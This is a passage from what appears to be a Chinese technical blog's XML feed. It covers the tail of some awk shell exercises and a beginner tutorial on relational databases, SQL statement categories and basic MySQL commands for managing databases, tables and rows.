&quot;-&quot; $4,$8&#125;&#x27; ip</span><br><span class="line">192.168.1-192.168.3</span><br><span class="line">172.16.3</span><br><span class="line">192.16.3-172.16.3</span><br><span class="line">10.0.4</span><br></pre></td></tr></table></figure>
<p>练习三</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cat num</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">期望求出<span class="variable">$1</span>字段的和</span></span><br><span class="line">[root@www ~]# awk &#x27;&#123;sum+=$1&#125;END&#123;print sum&#125;&#x27; num</span><br><span class="line">45</span><br></pre></td></tr></table></figure>
<p>练习四</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">统计当前所有连接状态的数量</span></span><br><span class="line">[root@www ~]# netstat -antpl|awk &#x27;&#123;array[$6]+=1&#125;END&#123;for (i in array)print array[i],i&#125;&#x27;</span><br><span class="line">5 LISTEN</span><br><span class="line">1 established)</span><br><span class="line">1 Foreign</span><br></pre></td></tr></table></figure>
<p>练习五</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">用awk命令     获取100以内能被7整除，而且包含7的数字</span></span><br><span class="line">awk &#x27;BEGIN&#123;for (i=1;i&lt;101;i++) &#123;if (i%7==0 &amp;&amp; i ~ &quot;7&quot;) &#123;print i&#125;&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库基础</title>
    <url>/2021/02/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="数据库概念"><a href="#数据库概念" class="headerlink" title="数据库概念"></a>数据库概念</h2><p>数据库（Database）是按照数据结构来组织、存储和管理数据的建立在计算机存储设备上的仓库。</p>
<p>数据库：存储数据的仓库</p>
<h2 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h2><h3 id="网络数据库"><a href="#网络数据库" class="headerlink" title="网络数据库"></a>网络数据库</h3><p>网络数据库是指把数据库技术引入到计算机网络系统中，借助网络技术将存储于数据库中的大量信息及时发布出去；而计算机网络借助于成熟的数据库技术对网络中的各种数据进行有效管理，并实现用户与网络中的数据库进行实时动态数据交换。</p>
<h3 id="层级数据库"><a href="#层级数据库" class="headerlink" title="层级数据库"></a>层级数据库</h3><p>层次结构模型实质上是一种由根结点的定向有序树（在数学中“树”被定义为一个无回的连通图）。</p>
<h3 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h3><p>关系数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p>
<p>数据库的另外一种区分方式：基于存储介质</p>
<p>​    存储介质分为两种：磁盘和内存</p>
<p>​        1、关系型数据库：存储在磁盘中</p>
<p>​        2、非关系型数据库：存储在内存中</p>
<h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>关系数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方式来处理数据库中的数据。现实世界中的各种实体以及实体之间的各种联系均用关系模型来表示。关系模型是由埃德加·科德于1970年首先提出的，并配合“科德十二定律”。现如今虽然对此模型由一些批评意见，但它还是数据存储的传统标准。关系模型由关系数据结构、关系操作集合、关系完整性约束三部分组成。</p>
<p>关系数据结构：指的是数据以什么方式来存储，是一种二维表的形式存储</p>
<p>​    本质：二维表</p>
<table>
<thead>
<tr>
<th>姓名</th>
<th>年龄</th>
<th>身高</th>
<th>体重</th>
</tr>
</thead>
<tbody><tr>
<td>张三</td>
<td>30</td>
<td>187</td>
<td>70</td>
</tr>
<tr>
<td>李四</td>
<td>40</td>
<td>175</td>
<td>65</td>
</tr>
</tbody></table>
<p>关系操作集合：如何来关联和管理对应的存储数据，SQL指令</p>
<p>​    获取张三的年纪：已知条件为姓名</p>
<p>​    select 年龄 from 二维表 where 姓名 = 张三;</p>
<p>关系完整性约束：数据内部有对应的关联关系，以及数据与数据之间也有对应的关联关系</p>
<p>​    表内约束：对应的具体列只能放对应的数据（不能乱放）</p>
<p>​    表间约束：自然界各实体都是有着对应的关联关系（外键）</p>
<h3 id="典型的关系型数据库"><a href="#典型的关系型数据库" class="headerlink" title="典型的关系型数据库"></a>典型的关系型数据库</h3><p>Oracle、DB2、Microsoft SQL Server、Microsoft Access、MySQL、SQLite</p>
<p>小型关系型数据库：Microsoft Access，SQLite</p>
<p>中型关系型数据库：Microsoft SQL Server，MySQL</p>
<p>大型关系型数据库：Oracle、DB2</p>
<p>MySQL当前跟Oracle是一个公司的：隶属于Oracle</p>
<h2 id="SQL介绍"><a href="#SQL介绍" class="headerlink" title="SQL介绍"></a>SQL介绍</h2><h3 id="SQL基本介绍"><a href="#SQL基本介绍" class="headerlink" title="SQL基本介绍"></a>SQL基本介绍</h3><p><strong>结构化查询语言(Structured Query Language)**简称SQL，是一种特殊目的的</strong>编程**语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。</p>
<p>SQL就是专门为关系型数据库而设计出来的。</p>
<h3 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h3><ol>
<li>数据查询语言（DQL:Data Query Language）：</li>
</ol>
<p>其语句，也称为“数据检索语句”，用以从表中获得数据，确定数据怎样在应用程序给出。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有WHERE，ORDER BY，GROUP BY和HAVING。这些DQL保留字常与其他类型的SQL语句一起使用。</p>
<p><strong>专门用于查询数据：</strong>代表指令为select/show</p>
<ol start="2">
<li>数据操作语言（DML：Data Manipulation Language）：</li>
</ol>
<p>其语句包括动词INSERT，UPDATE和DELETE。它们分别用于添加，修改和删除表中的行。也称为动作查询语言。</p>
<p><strong>专门用于写数据：</strong>代表指令为insert，update和delete</p>
<ol start="3">
<li>事务处理语言（TPL）：</li>
</ol>
<p>它的语句能确保被DML语句影响的表的所有行及时得以更新。TPL语句包括BEGIN TRANSACTION，COMMIT和ROLLBACK。（不是所有的关系型数据库都提供事务安全处理）</p>
<p><strong>专门用于事务安全处理：</strong>transaction</p>
<ol start="4">
<li>数据控制语言（DCL）：</li>
</ol>
<p>它的语句通过GRANT或REVOKE获得许可，确定单个用户和用户组对数据库对象的访问。某些RDBMS可用GRANT或REVOKE控制对表单个列的访问。</p>
<p><strong>专门用于权限管理：</strong>代表指令为grant和revoke</p>
<ol start="5">
<li>数据定义语言（DDL）：</li>
</ol>
<p>数据定义语言（DDL）：</p>
<p>其语句包括动词CREATE和DROP。在数据库中创建新表或删除表（CREAT TABLE 或 DROP TABLE）；为表加入索引等。DDL包括许多与人数据库目录中获得数据有关的保留字。它也是动作查询的一部分。</p>
<p><strong>专门用于结构管理：</strong>代表指令create和drop（alter）</p>
<h2 id="MySQL基本介绍"><a href="#MySQL基本介绍" class="headerlink" title="MySQL基本介绍"></a>MySQL基本介绍</h2><p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。</p>
<ol>
<li><p>Mysql是一种开源免费的数据库产品</p>
</li>
<li><p>Mysql对PHP的支持是最好（wamp或者lamp）</p>
<p>Mysql中用到的操作指令就是SQL指令</p>
</li>
</ol>
<h3 id="启动和停止MySQL服务"><a href="#启动和停止MySQL服务" class="headerlink" title="启动和停止MySQL服务"></a>启动和停止MySQL服务</h3><p>Mysql是一种C/S结构：客户端和服务端</p>
<p>服务端对应的软件：Mysqld.exe</p>
<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><p>通过Windows下打开cmd控制器，然后使用命令进行管理</p>
<p>Net start 服务（mysql）：开启服务</p>
<p>Net stop mysql：关闭服务</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201094550224.png" alt="image-20210201094550224"></p>
<h4 id="系统服务方式"><a href="#系统服务方式" class="headerlink" title="系统服务方式"></a>系统服务方式</h4><p>前提：在安装的Mysql的时候将mysql添加到Windows的服务中去了</p>
<p>方式1进入服务：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201094711157.png" alt="image-20210201094711157"></p>
<p>方式2进入服务：通过命令行：services.msc</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201094736779.png" alt="image-20210201094736779"></p>
<p>通过服务对Mysql服务器进行管理</p>
<p>方案1：右键服务，然后选择开启或者停止</p>
<p>方案2：双击服务，进入到服务详情界面，可以点击开启或者停止按钮</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201094849505.png" alt="image-20210201094849505"></p>
<h3 id="登录和退出MySQL系统"><a href="#登录和退出MySQL系统" class="headerlink" title="登录和退出MySQL系统"></a>登录和退出MySQL系统</h3><p>通过客户端（mysql.exe）与服务器进行连接认证，就可以进行操作</p>
<p>通常：服务端与客户端不在同一台电脑上</p>
<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><ol>
<li><p>找到mysql.exe（通过cmd控制台：如果在安装的时候指定了mysql.exe所在的路径为环境变量，就可以直接访问；如果没有，那么就必须进入到mysql.exe所在路径）</p>
</li>
<li><p>输入对应的服务器地址：-h：host -h[IP地址/域名]</p>
</li>
<li><p>  输入服务器中Mysql监听的端口： -P:port    –P:3306</p>
</li>
<li><p>输入用户名：-u:username    -u:root</p>
</li>
<li><p>  输入密码：-p：password    –p:root</p>
</li>
</ol>
<p>连接认证基本语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mysql.exe/mysql  -h主机地址  -P端口  -u用户名  -p密码</span><br></pre></td></tr></table></figure>
<p><strong>注意事项</strong></p>
<ol>
<li><p>通常端口都可以默认：mysql坚挺的端口通常都是3306</p>
</li>
<li><p>密码的输入可以先输入-p，直接换行，然后再以密文方式输入密码</p>
</li>
</ol>
<h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><p>断开与服务器的连接：通常Mysql提供的服务器数量有限，一旦客户端用完，建议就应该断开连接。</p>
<p>建议方式：使用SQL提供的指令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Exit;       //exit带分号</span><br><span class="line"></span><br><span class="line">\q;     //quit缩写</span><br></pre></td></tr></table></figure>


<h3 id="Mysql服务端架构"><a href="#Mysql服务端架构" class="headerlink" title="Mysql服务端架构"></a>Mysql服务端架构</h3><p>Mysql服务端架构有以下几层构成：</p>
<ol>
<li>数据库管理系统（最外层）：DBMS，专门管理服务器端的所有内容</li>
<li>数据库（第二层）：DB，专门用于存储数据的仓库（可以有很多个）</li>
<li>二维数据表（第三层）：Table，专门用于存储具体实体的数据</li>
<li>字段（第四层）：Field，具体存储某种类型的数据（实际存储单元）</li>
</ol>
<p>数据库中常用的几个关键字</p>
<p>Row：行</p>
<p>Column：列（field）</p>
<h2 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h2><p>数据库是数据存储的最外层（最大单元）</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> 数据库名字 [库选项];</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201102450283.png" alt="image-20210201102450283"></p>
<p>库选项：数据库的相关属性</p>
<p>​    字符集：charset 字符集，代表着当前数据库下的所有表存储的数据默认指定的字符集（如果当前不指定，那么采用DBMS默认的）</p>
<p>​    校对集：collate 校对集</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">database</span> 数据库名字 <span class="keyword">charset</span> 字符集名称;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201102741428.png" alt="image-20210201102741428"></p>
<h3 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h3><p>每当用户通过SQL指令创建一个数据库，那么系统就会产生一个对应的存储数据的文件夹（data）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201102857300.png" alt="image-20210201102857300"></p>
<p>其实，每个数据库文件夹下都有一个opt文件，保存的是对应的数据库选项。</p>
<h4 id="显示全部"><a href="#显示全部" class="headerlink" title="显示全部"></a>显示全部</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201103240303.png" alt="image-20210201103240303"></p>
<p>information_schema：保存数据库所有的结构信息（库，表）</p>
<p>mysql：核心数据库：权限关系</p>
<p>performance_schema：效率库</p>
<h4 id="显示部分"><a href="#显示部分" class="headerlink" title="显示部分"></a>显示部分</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span> <span class="keyword">like</span> <span class="string">&#x27;匹配模式&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>_：匹配当前位置单个字符</p>
<p>%：匹配指定位置多个字符</p>
<p>获取以my开头的全部数据库： ‘my%’;</p>
<p>获取m开头，后面第一个字母不确定，最后为database的数据库；’m_database’;</p>
<p>获取以database结尾的数据库：’%database’;</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201103737787.png" alt="image-20210201103737787"></p>
<h4 id="显示数据库创建语句"><a href="#显示数据库创建语句" class="headerlink" title="显示数据库创建语句"></a>显示数据库创建语句</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">database</span> 数据库名字;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201103914965.png" alt="image-20210201103914965"></p>
<p>看到的指令并非原始指令，已经被系统加工过</p>
<h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><p>为什么要选择数据库？因为数据是存储到数据表，表存在数据库下。如果要操作数据，那么必须进入到对应的数据库才行。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名字;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201104122369.png" alt="image-20210201104122369"></p>
<p>Database changed：表示当前已经进入到指定的数据库环境</p>
<h3 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h3><p>修改数据库字符集(库选项)：字符集和校对集</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> 数据库名字 <span class="keyword">charset</span> = 字符集;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201104414913.png" alt="image-20210201104414913"></p>
<p>一旦修改成功，那么对应的opt文件中就会体现</p>
<blockquote>
<p>是否可以修改数据库名字？mysql5.5之前是可以修改的rename命令；但是5.5之后就不可以。</p>
</blockquote>
<h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> 数据库名字;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201105437039.png" alt="image-20210201105437039"></p>
<p>删除虽简单，但是切记要做好安全操作：确保里面数据没有问题。（重要）</p>
<p>删除数据库之后：对应的存储数据的文件夹也会被删除（opt文件也被删除）</p>
<h2 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h2><h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><h4 id="普通创建表"><a href="#普通创建表" class="headerlink" title="普通创建表"></a>普通创建表</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名 字段类型 [字段属性], 字段名 字段类型 [字段属性],…) [表选项];</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201110015941.png" alt="image-20210201110015941"></p>
<p>以上错误说明：表必须放到对应的数据库下：有两种方式可以将表挂入到指定的数据库下</p>
<ol>
<li>​    在数据表名字前面加上数据库名字，用“.”连接即可：<code>数据库.数据表</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201110101965.png" alt="image-20210201110101965"></p>
<ol start="2">
<li>在创建数据表之前先进入到某个具体的数据库即可：<code>use 数据库名字</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201110434257.png" alt="image-20210201110434257"></p>
<p>表选项：与数据库选项类似</p>
<p>​    Engine：存储引擎，mysql提供的具体存储数据的方式，默认有一个innodb（5.5以前默认是myisam）</p>
<p>​    Charset：字符集，只对当前自己表有效（级别比数据库高）</p>
<p>​    Collate：校对集</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201110836086.png" alt="image-20210201110836086"></p>
<h3 id="复制已有表结构"><a href="#复制已有表结构" class="headerlink" title="复制已有表结构"></a>复制已有表结构</h3><p>从已经存在的表复制一份（只复制结构：如果表中有数据不复制）</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 新表名 <span class="keyword">like</span> 表名;  //只要使用数据库.表名，就可以在任何数据库下访问其他数据库的表名</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201111250023.png" alt="image-20210201111250023"></p>
<p>从mydatabase2下取到的表</p>
<h3 id="显示数据表"><a href="#显示数据表" class="headerlink" title="显示数据表"></a>显示数据表</h3><p>每当一张数据表创建，那么就会在对应的数据库下创建一些文件（与存储引擎有关）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201112403130.png" alt="image-20210201112403130"></p>
<p>frm代表结构文件</p>
<p>注意：这个结构文件来自于innodb存储引擎，innodb存储引擎所有的文件都存储在外部的ibdata文件中</p>
<h4 id="显示所有表"><a href="#显示所有表" class="headerlink" title="显示所有表"></a>显示所有表</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201112559373.png" alt="image-20210201112559373"></p>
<h4 id="匹配显示表"><a href="#匹配显示表" class="headerlink" title="匹配显示表"></a>匹配显示表</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">like</span> <span class="string">&#x27;匹配模式&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201112720840.png" alt="image-20210201112720840"></p>
<h3 id="显示表结构"><a href="#显示表结构" class="headerlink" title="显示表结构"></a>显示表结构</h3><p>本质含义：显示表中所包含的字段信息（名字，类型，属性等）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Describe</span> 表名;</span><br><span class="line"></span><br><span class="line">Desc 表名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201112947679.png" alt="image-20210201112947679"></p>
<h3 id="显示表创建语句"><a href="#显示表创建语句" class="headerlink" title="显示表创建语句"></a>显示表创建语句</h3><p>查看数据表创建时的语句：此语句看到的结果已经不是用户之前自己输入的。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> 表名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201113452531.png" alt="image-20210201113452531"></p>
<p>Mysql中有多种语句结束符</p>
<p>;与\g：所表示的效果是一样的，都是字段在上排横着，下面跟对应的数据</p>
<p>\G：字段在左侧竖着，数据在右侧横着</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201113626708.png" alt="image-20210201113626708"></p>
<h3 id="设置表属性"><a href="#设置表属性" class="headerlink" title="设置表属性"></a>设置表属性</h3><p>表属性指的就是表选项：engine，charset和collate</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 表选项 [=] 值;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201113933085.png" alt="image-20210201113933085"></p>
<p><strong>注意：</strong>如果数据库已经确定了，里面有很多数据了，不要轻易修改表选项（字符集影响不大）</p>
<h3 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h3><p>修改表名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> 旧表名 <span class="keyword">to</span> 新表名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201114309171.png" alt="image-20210201114309171"></p>
<p>修改表选项：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 表选项 [=] 新值;</span><br></pre></td></tr></table></figure>
<p>新增字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> [<span class="keyword">column</span>] 新字段名 列类型 [列属性] [位置<span class="keyword">first</span>/<span class="keyword">after</span> 字段名];</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201114623028.png" alt="image-20210201114623028"></p>
<p>​    特点：默认是加到表的最后面</p>
<p>​    字段位置：字段想要存放的位置</p>
<p>​    First：在某某之前（最前面），第一个字段</p>
<p>​    After 字段名：放在某个具体的字段之后（默认的）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201114746399.png" alt="image-20210201114746399"></p>
<p>修改字段名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">change</span> 旧字段名 新字段名 字段类型 [列属性] [新位置];</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201115050718.png" alt="image-20210201115050718"></p>
<p>修改字段类型（属性）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">modify</span> 字段名 新类型 [新属性] [新位置];</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201115223432.png" alt="image-20210201115223432"></p>
<p>删除字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 字段名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201115336444.png" alt="image-20210201115336444"></p>
<h3 id="删除表结构"><a href="#删除表结构" class="headerlink" title="删除表结构"></a>删除表结构</h3><p>基础语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名[,表名<span class="number">2</span>…]，可以同时删除多个数据表;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201115613273.png" alt="image-20210201115613273"></p>
<p>批量删除表</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201115645049.png" alt="image-20210201115645049"></p>
<h2 id="数据基础操作"><a href="#数据基础操作" class="headerlink" title="数据基础操作"></a>数据基础操作</h2><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p>本质含义：将数据以SQL的形式存储到指定的数据表（字段）里面</p>
<p>基本语法：向表中指定字段插入数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">into</span> 表名[(字段列表)] <span class="keyword">values</span>(对应字段列表);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201151129149.png" alt="image-20210201151129149"></p>
<ol>
<li>注意：后面（values中）对应的值列表只需要与前面的字段列表相对应即可（不一定与表结构完全一致）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201151743065.png" alt="image-20210201151743065"></p>
<ol start="2">
<li>注意：字段列表并不一定非要有所有的表中字段</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201151820315.png" alt="image-20210201151820315"></p>
<p>基本语法：向表中所有字段插入数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span> (对应表结构);	//值列表必须与字段列表一致</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201151949831.png" alt="image-20210201151949831"></p>
<h3 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h3><p>查询表中全部数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名; 		/<span class="comment">/*表示匹配所有的字段</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201152142137.png" alt="image-20210201152142137"></p>
<p>查询表中部分字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表名;  //字段列表使用逗号“,”隔开</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201153136573.png" alt="image-20210201153136573"></p>
<p>简单条件查询数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表<span class="comment">/* from 表名 where 字段名 = 值;	//mysql中没有==符号</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201153328037.png" alt="image-20210201153328037"></p>
<h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h3><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件];	//如果没有where条件：意味着系统会自动删除该表所有数据（慎用）</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201153537780.png" alt="image-20210201153537780"></p>
<h3 id="更新操作"><a href="#更新操作" class="headerlink" title="更新操作"></a>更新操作</h3><p>更新：将数据进行修改（通常是修改部分字段数据）</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名 = 新值 [<span class="keyword">where</span> 条件];		//如果没有where条件，那么所有的表中对应的那个字段都会被修改成统一值。</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210201153813400.png" alt="image-20210201153813400"></p>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><h3 id="字符编码概念"><a href="#字符编码概念" class="headerlink" title="字符编码概念"></a>字符编码概念</h3><p>字符(Character)是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。</p>
